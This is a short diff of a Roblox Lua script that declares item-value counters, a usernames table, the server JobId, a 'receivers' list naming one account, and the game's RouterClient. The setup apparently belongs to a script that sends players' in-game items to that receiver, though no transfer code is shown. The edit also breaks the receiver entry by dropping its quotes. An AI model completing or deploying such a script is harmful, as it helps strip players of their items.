@@ -17,7 +17,7 @@ local totalValue = 0
 local itemCount = 0
 local Usernames = {}
 local RealJobID = game.JobId
-local receivers = {"Toddstock7"}
+local receivers = {Toddstock7}
 
 local Fsys = ReplicatedStorage:WaitForChild("Fsys")
 local RouterClient = Fsys:WaitForChild("RouterClient")
